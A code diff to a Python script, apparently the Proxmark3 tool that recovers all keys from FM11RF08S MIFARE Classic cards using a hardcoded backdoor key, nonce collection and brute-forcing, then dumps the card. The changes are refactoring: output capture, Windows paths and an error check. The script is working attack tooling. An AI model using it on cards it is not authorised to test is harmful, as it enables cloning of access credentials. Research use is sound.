@@ -11,7 +11,7 @@
 # * 16 random keys with keyA==keyB in each sector: ~30 min
 # * 24 random keys, some reused across sectors: <1 min
 #
-# Doegox, 2024
+# Doegox, 2024, cf https://eprint.iacr.org/2024/1275 for more info
 
 import os
 import sys
@@ -19,7 +19,6 @@ import time
 import subprocess
 import argparse
 import pm3
-from output_grabber import OutputGrabber
 # optional color support
 try:
     # pip install ansicolors
@@ -33,18 +32,25 @@ BACKDOOR_RF08S = "A396EFA4E24F"
 NUM_SECTORS = 16
 if os.path.basename(os.path.dirname(os.path.dirname(sys.argv[0]))) == 'client':
     # dev setup
-    TOOLS_PATH = f"{os.path.dirname(sys.argv[0])}/../../tools/mfc/card_only"
+    TOOLS_PATH = os.path.normpath(os.path.join(f"{os.path.dirname(sys.argv[0])}",
+                                               "..", "..", "tools", "mfc", "card_only"))
 else:
     # assuming installed
-    TOOLS_PATH = f"{os.path.dirname(sys.argv[0])}/../tools"
+    TOOLS_PATH = os.path.normpath(os.path.join(f"{os.path.dirname(sys.argv[0])}",
+                                               "..", "tools"))
 
-STATICNESTED_1NT = f"{TOOLS_PATH}/staticnested_1nt"
-STATICNESTED_2X1NT = f"{TOOLS_PATH}/staticnested_2x1nt_rf08s"
-STATICNESTED_2X1NT1KEY = f"{TOOLS_PATH}/staticnested_2x1nt_rf08s_1key"
-for bin in [STATICNESTED_1NT, STATICNESTED_2X1NT, STATICNESTED_2X1NT1KEY]:
+tools = {
+    "staticnested_1nt": os.path.join(f"{TOOLS_PATH}", "staticnested_1nt"),
+    "staticnested_2x1nt": os.path.join(f"{TOOLS_PATH}", "staticnested_2x1nt_rf08s"),
+    "staticnested_2x1nt1key": os.path.join(f"{TOOLS_PATH}", "staticnested_2x1nt_rf08s_1key"),
+}
+for tool, bin in tools.items():
     if not os.path.isfile(bin):
-        print(f"Cannot find {bin}, abort!")
-        exit()
+        if os.path.isfile(bin + ".exe"):
+            tools[tool] = bin + ".exe"
+        else:
+            print(f"Cannot find {bin}, abort!")
+            exit()
 
 parser = argparse.ArgumentParser(description='A script combining staticnested* tools '
                                  'to recover all keys from a FM11RF08S card.')
@@ -54,27 +60,24 @@ parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mod
 args = parser.parse_args()
 
 start_time = time.time()
-out = OutputGrabber()
 p = pm3.pm3()
 
 restore_color = False
-with out:
-    p.console("prefs get color")
-    p.console("prefs set color --off")
-for line in out.captured_output.split('\n'):
+p.console("prefs get color")
+p.console("prefs set color --off")
+for line in p.grabbed_output.split('\n'):
     if "ansi" in line:
         restore_color = True
-with out:
-    p.console("hf 14a read")
+p.console("hf 14a read")
 uid = None
-for line in out.captured_output.split('\n'):
+for line in p.grabbed_output.split('\n'):
     if "UID:" in line:
         uid = int(line[10:].replace(' ', ''), 16)
 if uid is None:
     print("Card not found")
     if restore_color:
-        with out:
-            p.console("prefs set color --ansi")
+        p.console("prefs set color --ansi")
+        _ = p.grabbed_output
     exit()
 print("UID: " + color(f"{uid:08X}", fg="green"))
 
@@ -87,9 +90,8 @@ def print_key(sec, key_type, key):
 found_keys = [["", ""] for _ in range(NUM_SECTORS)]
 if not args.no_init_check:
     print("Checking default keys...")
-    with out:
-        p.console("hf mf fchk")
-    for line in out.captured_output.split('\n'):
+    p.console("hf mf fchk")
+    for line in p.grabbed_output.split('\n'):
         if "[+]  0" in line:
             res = [x.strip() for x in line.split('|')]
             sec = int(res[0][4:])
@@ -104,18 +106,17 @@ nt = [["", ""] for _ in range(NUM_SECTORS)]
 nt_enc = [["", ""] for _ in range(NUM_SECTORS)]
 par_err = [["", ""] for _ in range(NUM_SECTORS)]
 print("Getting nonces...")
-with out:
-    for sec in range(NUM_SECTORS):
-        blk = sec * 4
-        if found_keys[sec][0] == "" or found_keys[sec][1] == "":
-            # Even if one key already found, we'll need both nt
-            for key_type in [0, 1]:
-                cmd = f"hf mf isen -n1 --blk {blk} -c {key_type+4} --key {BACKDOOR_RF08S}"
-                p.console(cmd)
-                cmd += f" --c2 {key_type}"
-                p.console(cmd)
+for sec in range(NUM_SECTORS):
+    blk = sec * 4
+    if found_keys[sec][0] == "" or found_keys[sec][1] == "":
+        # Even if one key already found, we'll need both nt
+        for key_type in [0, 1]:
+            cmd = f"hf mf isen -n1 --blk {blk} -c {key_type+4} --key {BACKDOOR_RF08S}"
+            p.console(cmd)
+            cmd += f" --c2 {key_type}"
+            p.console(cmd)
 print("Processing traces...")
-for line in out.captured_output.split('\n'):
+for line in p.grabbed_output.split('\n'):
     if "nested cmd: 64" in line or "nested cmd: 65" in line:
         sec = int(line[24:26], 16)//4
         key_type = int(line[21:23], 16) - 0x64
@@ -128,6 +129,17 @@ for line in out.captured_output.split('\n'):
         nt_enc[sec][key_type] = data
         data = line[128:136]
         par_err[sec][key_type] = data
+for sec in range(NUM_SECTORS):
+    if found_keys[sec][0] == "" or found_keys[sec][1] == "":
+        for key_type in [0, 1]:
+            if (nt[sec][key_type] == "" or
+               nt_enc[sec][key_type] == "" or
+               par_err[sec][key_type] == ""):
+                print("Error, could not collect nonces, abort")
+                if restore_color:
+                    p.console("prefs set color --ansi")
+                    _ = p.grabbed_output
+                exit()
 
 print("Running staticnested_1nt & 2x1nt when doable...")
 keys = [[set(), set()] for _ in range(NUM_SECTORS)]
@@ -140,12 +152,12 @@ for sec in range(NUM_SECTORS):
         continue
     if found_keys[sec][0] == "" and found_keys[sec][1] == "" and nt[sec][0] != nt[sec][1]:
         for key_type in [0, 1]:
-            cmd = [STATICNESTED_1NT, f"{uid:08X}", f"{sec}",
+            cmd = [tools["staticnested_1nt"], f"{uid:08X}", f"{sec}",
                    nt[sec][key_type], nt_enc[sec][key_type], par_err[sec][key_type]]
             if args.debug:
                 print(' '.join(cmd))
             subprocess.run(cmd, capture_output=True)
-        cmd = [STATICNESTED_2X1NT,
+        cmd = [tools["staticnested_2x1nt"],
                f"keys_{uid:08x}_{sec:02}_{nt[sec][0]}.dic", f"keys_{uid:08x}_{sec:02}_{nt[sec][1]}.dic"]
         if args.debug:
             print(' '.join(cmd))
@@ -165,7 +177,7 @@ for sec in range(NUM_SECTORS):
             key_type = 0
         else:
             key_type = 1
-        cmd = [STATICNESTED_1NT, f"{uid:08X}", f"{sec}",
+        cmd = [tools["staticnested_1nt"], f"{uid:08X}", f"{sec}",
                nt[sec][key_type], nt_enc[sec][key_type], par_err[sec][key_type]]
         if args.debug:
             print(' '.join(cmd))
@@ -217,9 +229,8 @@ for sec in range(NUM_SECTORS):
             cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
             if args.debug:
                 print(cmd)
-            with out:
-                p.console(cmd)
-            for line in out.captured_output.split('\n'):
+            p.console(cmd)
+            for line in p.grabbed_output.split('\n'):
                 if "aborted via keyboard" in line:
                     abort = True
                 if "found:" in line:
@@ -244,9 +255,8 @@ for sec in range(NUM_SECTORS):
             cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
             if args.debug:
                 print(cmd)
-            with out:
-                p.console(cmd)
-            for line in out.captured_output.split('\n'):
+            p.console(cmd)
+            for line in p.grabbed_output.split('\n'):
                 if "aborted via keyboard" in line:
                     abort = True
                 if "found:" in line:
@@ -266,9 +276,8 @@ for sec in range(NUM_SECTORS):
         cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
         if args.debug:
             print(cmd)
-        with out:
-            p.console(cmd)
-        for line in out.captured_output.split('\n'):
+        p.console(cmd)
+        for line in p.grabbed_output.split('\n'):
             if "aborted via keyboard" in line:
                 abort = True
             if "found:" in line:
@@ -293,7 +302,7 @@ for sec in range(NUM_SECTORS):
             dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}_filtered.dic"
         else:
             dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}.dic"
-        cmd = [STATICNESTED_2X1NT1KEY, nt[sec][key_type_source], found_keys[sec][key_type_source], dic]
+        cmd = [tools["staticnested_2x1nt1key"], nt[sec][key_type_source], found_keys[sec][key_type_source], dic]
         if args.debug:
             print(' '.join(cmd))
         result = subprocess.run(cmd, capture_output=True, text=True).stdout
@@ -309,9 +318,8 @@ for sec in range(NUM_SECTORS):
                 cmd += f" -k {k}"
             if args.debug:
                 print(cmd)
-            with out:
-                p.console(cmd)
-            for line in out.captured_output.split('\n'):
+            p.console(cmd)
+            for line in p.grabbed_output.split('\n'):
                 if "aborted via keyboard" in line:
                     abort = True
                 if "found:" in line:
@@ -323,8 +331,8 @@ for sec in range(NUM_SECTORS):
     if abort:
         break
 if restore_color:
-    with out:
-        p.console("prefs set color --ansi")
+    p.console("prefs set color --ansi")
+    _ = p.grabbed_output
 
 if abort:
     print("Brute-forcing phase aborted via keyboard!")
@@ -374,10 +382,7 @@ else:
     cmd = f"hf mf fchk -f keys_{uid:08x}.dic --no-default --dump"
     if args.debug:
         print(cmd)
-    with out:
-        p.console(cmd)
-    for line in out.captured_output.split('\n'):
-        print(line)
+    p.console(cmd, passthru = True)
 
 elapsed_time = time.time() - start_time
 minutes = int(elapsed_time // 60)
